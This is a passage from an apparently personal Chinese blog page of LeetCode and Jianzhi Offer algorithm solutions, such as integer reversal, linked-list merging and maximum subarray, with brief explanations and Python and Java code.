class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">if</span>(i <span class="keyword">in</span> pushList):</span><br><span class="line">                stack.append(i)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top = stack.pop()</span><br><span class="line">                <span class="keyword">while</span>(top != <span class="string">&quot;[&quot;</span>):</span><br><span class="line">                    tmp = top + tmp</span><br><span class="line">                    top = stack.pop()</span><br><span class="line">                top = stack.pop() <span class="comment">#pop [</span></span><br><span class="line">                <span class="comment">#get num</span></span><br><span class="line">                num = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">while</span>(top != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> (<span class="string">&#x27;0&#x27;</span> &lt;= top &lt;= <span class="string">&#x27;9&#x27;</span>)):</span><br><span class="line">                    num = top + num</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">len</span>(stack) &gt; <span class="number">0</span>):</span><br><span class="line">                        top = stack.pop()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                tmp = <span class="built_in">int</span>(num) * tmp</span><br><span class="line">                <span class="keyword">if</span>(top != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> (top &lt; <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> top &gt; <span class="string">&#x27;9&#x27;</span>)):</span><br><span class="line">                    stack.append(top)</span><br><span class="line">                stack = stack + <span class="built_in">list</span>(tmp)</span><br><span class="line">        <span class="keyword">return</span> res + <span class="string">&quot;&quot;</span>.join(stack)</span><br></pre></td></tr></table></div></figure>




        <h2 id="整数反转"   >
          <a href="#整数反转" class="heading-link"><i class="fas fa-link"></i></a><a href="#整数反转" class="headerlink" title="整数反转"></a>整数反转</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221010144212174.png" alt="image-20221010144212174"></p>
<p>使用模加除即可解决，主要考虑溢出情况</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x == Integer.MIN_VALUE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> calcuTmp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> signed = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            signed = -<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            signed = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> tmp = signed * x;</span><br><span class="line">        <span class="keyword">while</span> (tmp != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(calcuTmp &gt; Integer.MAX_VALUE/<span class="number">10</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            calcuTmp *= <span class="number">10</span>;</span><br><span class="line">            calcuTmp += (tmp % <span class="number">10</span>);</span><br><span class="line">            tmp = (tmp - (tmp % <span class="number">10</span>)) / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> signed * calcuTmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="电话号码的字母组合"   >
          <a href="#电话号码的字母组合" class="heading-link"><i class="fas fa-link"></i></a><a href="#电话号码的字母组合" class="headerlink" title="电话号码的字母组合"></a>电话号码的字母组合</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221010180907032.png" alt="image-20221010180907032"></p>
<p>全排列问题基本都用回溯法解决，基本公式就是</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span>(<span class="params">idx</span>):</span></span><br><span class="line">	<span class="keyword">if</span>(limitCondition):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> inputList:</span><br><span class="line">		operate()<span class="comment">#一般都是push之类的</span></span><br><span class="line">    	back(idx+<span class="number">1</span>)</span><br><span class="line">        operate()<span class="comment">#一般都是pop之类的</span></span><br><span class="line">back(<span class="number">0</span>)</span><br></pre></td></tr></table></div></figure>

<p>如下解决</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">letterCombinations</span>(<span class="params">self, digits: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span></span><br><span class="line"></span><br><span class="line">        phoneMap = &#123;</span><br><span class="line">            <span class="string">&quot;2&quot;</span>: <span class="string">&quot;abc&quot;</span>,</span><br><span class="line">            <span class="string">&quot;3&quot;</span>: <span class="string">&quot;def&quot;</span>,</span><br><span class="line">            <span class="string">&quot;4&quot;</span>: <span class="string">&quot;ghi&quot;</span>,</span><br><span class="line">            <span class="string">&quot;5&quot;</span>: <span class="string">&quot;jkl&quot;</span>,</span><br><span class="line">            <span class="string">&quot;6&quot;</span>: <span class="string">&quot;mno&quot;</span>,</span><br><span class="line">            <span class="string">&quot;7&quot;</span>: <span class="string">&quot;pqrs&quot;</span>,</span><br><span class="line">            <span class="string">&quot;8&quot;</span>: <span class="string">&quot;tuv&quot;</span>,</span><br><span class="line">            <span class="string">&quot;9&quot;</span>: <span class="string">&quot;wxyz&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        com = []</span><br><span class="line">        coms = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">backTrace</span>(<span class="params">idx</span>):</span></span><br><span class="line">            <span class="keyword">if</span>(idx == <span class="built_in">len</span>(digits)):</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            digit = digits[idx]</span><br><span class="line">            <span class="keyword">for</span> letter <span class="keyword">in</span> phoneMap[digit]:</span><br><span class="line">                com.append(letter)</span><br><span class="line">                backTrace(idx + <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">len</span>(com) == <span class="built_in">len</span>(digits)):</span><br><span class="line">                    coms.append(<span class="string">&quot;&quot;</span>.join(com))</span><br><span class="line">                com.pop()</span><br><span class="line">        backTrace(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> coms</span><br></pre></td></tr></table></div></figure>






        <h2 id="删除链表的倒数第n个结点"   >
          <a href="#删除链表的倒数第n个结点" class="heading-link"><i class="fas fa-link"></i></a><a href="#删除链表的倒数第n个结点" class="headerlink" title="删除链表的倒数第n个结点"></a>删除链表的倒数第n个结点</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221011104404437.png" alt="image-20221011104404437"></p>
<p>使用快慢指针</p>
<ul>
<li><p>定义伪头部节点，指向头部节点</p>
</li>
<li><p>快指针同时指向伪头部节点</p>
</li>
<li><p>快指针先遍历n次，慢指针不动</p>
</li>
<li><p>快指针接着遍历，同时慢指针也开始遍历，快指针遍历到尾部，即<code>fastPoint.next=null</code>时结束，此时慢指针就遍历到<code>len(list) - n</code>个节点，即倒数第n个节点。</p>
</li>
</ul>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">removeNthFromEnd</span><span class="params">(ListNode head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        ListNode beHead = <span class="keyword">new</span> ListNode();</span><br><span class="line">        beHead.next = head;</span><br><span class="line">        ListNode fastPoint = beHead;</span><br><span class="line">        ListNode slowPoint = beHead;</span><br><span class="line">        <span class="keyword">while</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            fastPoint = fastPoint.next;</span><br><span class="line">            n--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(fastPoint.next != <span class="keyword">null</span>)&#123;</span><br><span class="line">            slowPoint = slowPoint.next;</span><br><span class="line">            fastPoint = fastPoint.next;</span><br><span class="line">        &#125;</span><br><span class="line">        slowPoint.next = slowPoint.next.next;</span><br><span class="line">        <span class="keyword">return</span> beHead.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>当然先一次遍历获取链表长度也可以。</p>
<p>或者使用栈来进行辅助，遍历一遍全部压入，然后弹出N个结点即可。</p>

        <h2 id="合并两个有序链表"   >
          <a href="#合并两个有序链表" class="heading-link"><i class="fas fa-link"></i></a><a href="#合并两个有序链表" class="headerlink" title="合并两个有序链表"></a>合并两个有序链表</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221011133912036.png" alt="image-20221011133912036"></p>
<p>直接归并即可</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode list1, ListNode list2)</span> </span>&#123;</span><br><span class="line">        ListNode newList = <span class="keyword">new</span> ListNode();</span><br><span class="line">        ListNode originList = newList;</span><br><span class="line">        <span class="keyword">while</span>(list1 != <span class="keyword">null</span> &amp;&amp; list2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(list1 != <span class="keyword">null</span> &amp;&amp; list2 != <span class="keyword">null</span> &amp;&amp; list1.val &lt;= list2.val)&#123;</span><br><span class="line">                newList.next = list1;</span><br><span class="line">                newList = newList.next;</span><br><span class="line">                list1 = list1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(list1 != <span class="keyword">null</span> &amp;&amp; list2 != <span class="keyword">null</span> &amp;&amp; list2.val &lt;= list1.val )&#123;</span><br><span class="line">                newList.next = list2;</span><br><span class="line">                newList = newList.next;</span><br><span class="line">                list2 = list2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(list1 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            newList.next = list2;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            newList.next = list1;</span><br><span class="line">            <span class="comment">//newList.next.next = list1;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> originList.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="合并K个升序链表"   >
          <a href="#合并K个升序链表" class="heading-link"><i class="fas fa-link"></i></a><a href="#合并K个升序链表" class="headerlink" title="合并K个升序链表"></a>合并K个升序链表</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221011145532993.png" alt="image-20221011145532993"></p>
<p>即归并分治</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeTwoLists</span><span class="params">(ListNode list1, ListNode list2)</span> </span>&#123;</span><br><span class="line">        ListNode newList = <span class="keyword">new</span> ListNode();</span><br><span class="line">        ListNode originList = newList;</span><br><span class="line">        <span class="keyword">while</span>(list1 != <span class="keyword">null</span> &amp;&amp; list2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(list1 != <span class="keyword">null</span> &amp;&amp; list2 != <span class="keyword">null</span> &amp;&amp; list1.val &lt;= list2.val)&#123;</span><br><span class="line">                newList.next = list1;</span><br><span class="line">                newList = newList.next;</span><br><span class="line">                list1 = list1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(list1 != <span class="keyword">null</span> &amp;&amp; list2 != <span class="keyword">null</span> &amp;&amp; list2.val &lt;= list1.val )&#123;</span><br><span class="line">                newList.next = list2;</span><br><span class="line">                newList = newList.next;</span><br><span class="line">                list2 = list2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(list1 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            newList.next = list2;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            newList.next = list1;</span><br><span class="line">            <span class="comment">//newList.next.next = list1;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> originList.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">merge</span><span class="params">(ListNode[] lists, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left == right) &#123;</span><br><span class="line">            <span class="keyword">return</span> lists[left];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (left &gt; right) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> mergeTwoLists(merge(lists, left, mid), merge(lists, mid + <span class="number">1</span>, right));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">mergeKLists</span><span class="params">(ListNode[] lists)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> merge(lists, <span class="number">0</span>, lists.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>需要注意的是使用<code>left == right</code>来确定每一个都遍历到。</p>

        <h2 id="找出字符串中第一个匹配项的下标"   >
          <a href="#找出字符串中第一个匹配项的下标" class="heading-link"><i class="fas fa-link"></i></a><a href="#找出字符串中第一个匹配项的下标" class="headerlink" title="找出字符串中第一个匹配项的下标"></a>找出字符串中第一个匹配项的下标</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221011164112082.png" alt="image-20221011164112082"></p>
<p>爆破遍历即可</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">strStr</span>(<span class="params">self, haystack: <span class="built_in">str</span>, needle: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        i,j=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        res = <span class="built_in">len</span>(haystack)</span><br><span class="line">        <span class="keyword">for</span> cIdx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(haystack)):</span><br><span class="line">            i = cIdx</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span>(haystack[i] == needle[j]):</span><br><span class="line">                <span class="keyword">while</span>(j &lt; <span class="built_in">len</span>(needle) <span class="keyword">and</span> i &lt; <span class="built_in">len</span>(haystack) <span class="keyword">and</span> haystack[i] == needle[j]):</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(j == <span class="built_in">len</span>(needle)):</span><br><span class="line">                    res = <span class="built_in">min</span>(res,i - <span class="built_in">len</span>(needle))</span><br><span class="line">                    <span class="comment">#i -= 1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(res == <span class="built_in">len</span>(haystack)):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>


        <h1 id="剑指Offer"   >
          <a href="#剑指Offer" class="heading-link"><i class="fas fa-link"></i></a><a href="#剑指Offer" class="headerlink" title="剑指Offer"></a>剑指Offer</h1>
      
        <h2 id="两个栈实现队列"   >
          <a href="#两个栈实现队列" class="heading-link"><i class="fas fa-link"></i></a><a href="#两个栈实现队列" class="headerlink" title="两个栈实现队列"></a>两个栈实现队列</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221014144203634.png" alt="image-20221014144203634"></p>
<p>一个栈当输入，一个栈当输出</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CQueue</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.A = []</span><br><span class="line">        self.B = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">appendTail</span>(<span class="params">self, value: <span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.A.append(value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteHead</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(self.B) != <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> self.B.pop()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">while</span>(<span class="built_in">len</span>(self.A) != <span class="number">0</span>):</span><br><span class="line">                self.B.append(self.A.pop())</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(self.B) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.B.pop()</span><br></pre></td></tr></table></div></figure>


        <h2 id="数组中重复的数字"   >
          <a href="#数组中重复的数字" class="heading-link"><i class="fas fa-link"></i></a><a href="#数组中重复的数字" class="headerlink" title="数组中重复的数字"></a>数组中重复的数字</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221014144507145.png" alt="image-20221014144507145"></p>
<p>使用hash表即可</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findRepeatNumber</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        hashset = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span>(i <span class="keyword">in</span> hashset):</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hashset.add(i)</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="反转链表"   >
          <a href="#反转链表" class="heading-link"><i class="fas fa-link"></i></a><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221014152712281.png" alt="image-20221014152712281"></p>
<p>先是自己写的，从尾部开始改变，时间耗费较多</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseList</span>(<span class="params">self, head: ListNode</span>) -&gt; ListNode:</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">None</span> <span class="keyword">or</span> head.<span class="built_in">next</span> == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        originHead = head</span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(originHead.<span class="built_in">next</span> != <span class="literal">None</span>):</span><br><span class="line">            head = originHead</span><br><span class="line">            <span class="keyword">while</span>(head.<span class="built_in">next</span> != <span class="literal">None</span>):</span><br><span class="line">                tmp = head</span><br><span class="line">                <span class="built_in">next</span> = head.<span class="built_in">next</span></span><br><span class="line">                head = <span class="built_in">next</span></span><br><span class="line">            flag += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(flag == <span class="number">1</span>):</span><br><span class="line">                newHead = head</span><br><span class="line">            tmp.<span class="built_in">next</span> = <span class="literal">None</span></span><br><span class="line">            head.<span class="built_in">next</span> = tmp</span><br><span class="line">        <span class="keyword">return</span> newHead</span><br></pre></td></tr></table></div></figure>

<p>后面看题解，可以用多指针来代替，暂存前中后三个节点</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/fan-zhuan-lian-biao-lcof/solution/jian-zhi-offer-24-fan-zhuan-lian-biao-die-dai-di-2/" >剑指 Offer 24. 反转链表（迭代 / 递归，清晰图解） - 反转链表 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseList</span>(<span class="params">self, head: ListNode</span>) -&gt; ListNode:</span></span><br><span class="line">        pre = <span class="literal">None</span></span><br><span class="line">        cur = head</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">None</span>):</span><br><span class="line">            tmp = cur.<span class="built_in">next</span></span><br><span class="line">            cur.<span class="built_in">next</span> = pre</span><br><span class="line">            pre = cur</span><br><span class="line">            cur = tmp</span><br><span class="line">        <span class="keyword">return</span> pre</span><br></pre></td></tr></table></div></figure>

<p>同样的循环可以转化为递归</p>

        <h2 id="连续子数组的最大和"   >
          <a href="#连续子数组的最大和" class="heading-link"><i class="fas fa-link"></i></a><a href="#连续子数组的最大和" class="headerlink" title="连续子数组的最大和"></a>连续子数组的最大和</h2>
      <p>最优子数组的一般都能动态规划</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015102433428.png" alt="image-20221015102433428"></p>
<p>动态规划</p>
<p>设dp[i]为以i为结尾的连续子数组和的最大值，即可得到状态转换方程</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[i] = max(nums[i],dp[i-1] + nums[i])</span><br></pre></td></tr></table></div></figure>

<p>依据状态转换方程得到代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxSubArray</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        dp = [<span class="number">0</span>] * <span class="built_in">len</span>(nums)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">                dp[i] = nums[<span class="number">0</span>]</span><br><span class="line">                res = dp[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[i] = <span class="built_in">max</span>(nums[i],dp[i-<span class="number">1</span>] + nums[i])</span><br><span class="line">                res = <span class="built_in">max</span>(res,dp[i])</span><br><span class="line">        <span class="keyword">return</span> 